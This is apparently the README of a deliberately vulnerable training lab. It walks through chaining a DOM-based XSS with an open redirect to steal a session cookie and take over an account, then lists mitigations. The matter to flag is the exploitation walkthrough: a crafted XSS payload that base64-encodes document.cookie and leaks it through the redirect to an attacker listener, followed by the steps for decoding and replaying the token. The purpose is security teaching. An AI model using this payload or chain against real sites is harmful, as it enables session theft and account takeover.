# Campaign Track Lab – DOM XSS + Open Redirect → Session Hijacking

A realistic, self‑contained web application that demonstrates a **DOM‑Based Cross‑Site Scripting (XSS)** chained with an **Open Redirect** leading to **session hijacking and account takeover**.

---

## 🎯 Vulnerability Chain

1. **Open Redirect** – `origin` parameter redirects to any URL without validation.
2. **DOM‑Based XSS** – `displayOrigin` is injected into the page via `innerHTML`.
3. **Session Hijacking** – Attacker’s XSS payload overwrites the global `utm_source` variable with the base64‑encoded `auth-token` cookie. The redirect then appends `utm_source` to the attacker’s server, leaking the token.
4. **Account Takeover** – Attacker sets the stolen cookie in their own browser and instantly becomes the victim.

---

## 📦 Requirements

- [Node.js](https://nodejs.org/) (v14+)
- A modern web browser
- (Optional) Python for a quick HTTP listener: `python3 -m http.server`

---

## 🚀 Setup & Installation

```bash
# Clone or download the lab folder
cd bb-001-dom-xss-open-redirect-lab

# Install dependencies
npm install

# Start the server
npm start
```

The application runs at `http://localhost:3000`.

---


## 👤 User Flow

1. **Register** at `/app/register` – any email/password/name.
2. **Login** automatically after registration (or manually at `/app/login`).
3. **Dashboard** (`/app/dashboard`) shows user‑specific data fetched via API.
4. **Logout** clears the `auth-token` cookie.

---

## ⚠️ Vulnerable Endpoint: `/loader`

| Parameter         | Purpose                                                                 | Vulnerability               |
|-------------------|-------------------------------------------------------------------------|-----------------------------|
| `origin`          | URL to redirect after `timeoutDuration` ms                             | **Open Redirect**           |
| `displayOrigin`   | HTML inserted directly into the page                                   | **DOM‑Based XSS**           |
| `timeoutDuration` | Milliseconds before redirect (default 0)                               | Timing for exploit          |
| `utm_source`      | Normal tracking parameter – also stored in `window.utm_source`         | Data exfiltration channel   |

The redirect **appends the current value of `window.utm_source`** to the `origin` URL as a query parameter (`?utm_source=...`).

---

## 🔥 Exploitation – Step by Step

### 1. Start the lab

```bash
npm start
```

### 2. Victim registers & logs in

- Open `http://localhost:3000/app/register`
- Create account: `victim@example.com` / `pass` / `Alice Victim`
- Dashboard shows “Welcome, Alice Victim”.

### 3. Attacker starts a listener (to capture the cookie)

```bash
python3 -m http.server 8080
```

### 4. Attacker crafts the malicious link

Replace `localhost:8080` with the attacker’s listener address.

```http
http://localhost:3000/loader?origin=http://localhost:8080/steal&displayOrigin=<img src=x onerror="window.utm_source=encodeURIComponent(btoa(document.cookie))">&timeoutDuration=2000
```

**Payload breakdown:**

- `displayOrigin` injects an `<img>` whose `onerror` overwrites `window.utm_source` with `btoa(document.cookie)` (base64 of the whole cookie).
- `timeoutDuration=2000` gives the XSS time to execute.
- After 2 seconds, the page redirects to `http://localhost:8080/steal?utm_source=<base64 cookie>`.

### 5. Victim clicks the link (while logged in)

- The XSS runs silently.
- The attacker’s listener receives a request:

```
127.0.0.1 - - [04/Apr/2026 12:34:56] "GET /steal?utm_source=YWN0aW9uOnZpY3RpbUBleGFtcGxlLmNvbToxNzQzNzg5... HTTP/1.1" 200 -
```

### 6. Attacker decodes the stolen value

Copy the `utm_source` parameter and decode it in the browser console:

```javascript
atob("YWN0aW9uOnZpY3RpbUBleGFtcGxlLmNvbToxNzQzNzg5...")
```

Output example:
`auth-token=dmljdGltQGV4YW1wbGUuY29tOjE3NDM3ODk1NjQ6eGZocmRz`

### 7. Attacker replaces the victim’s session

- Open a **new private browser window** (or clear cookies).
- Go to `http://localhost:3000/app/dashboard` – you will be redirected to login (no session).
- Open DevTools → **Application** → **Cookies** → `http://localhost:3000`
- Add a cookie:
  - **Name:** `auth-token`
  - **Value:** the token from step 6 (e.g., `dmljdGltQGV4YW1wbGUuY29tOjE3NDM3ODk1NjQ6eGZocmRz`)
- Refresh the page.

**Result:** The attacker is now logged in as **Alice Victim**, seeing her campaigns and personal data.
✅ **Account takeover achieved.**

---

## 🛡️ Mitigation (Real‑World Fixes)

- **DOM XSS:** Never insert untrusted data into `innerHTML` / `document.write`. Use `textContent`, `innerText`, or safe DOM methods.
- **Open Redirect:** Validate `origin` against an allowlist of trusted domains. Avoid redirects based on user input when possible.
- **Session Cookie:** Set `httpOnly`, `Secure`, `SameSite=Strict`. Bind session to IP or user‑agent for additional hardening.
- **Content Security Policy (CSP):** Restrict `script-src` and `object-src` to prevent inline execution.

---

## 📝 Notes

- This lab is for **educational purposes only**.
- The `auth-token` cookie is intentionally `httpOnly: false` to demonstrate JavaScript exfiltration.
- In a real application, session tokens can also be stolen from `localStorage` or via XSS that reads memory.
- The open redirect alone is a phishing risk; chained with XSS it becomes critical.

---

## 📄 License

MIT – Free to use for security training and demonstrations.

---
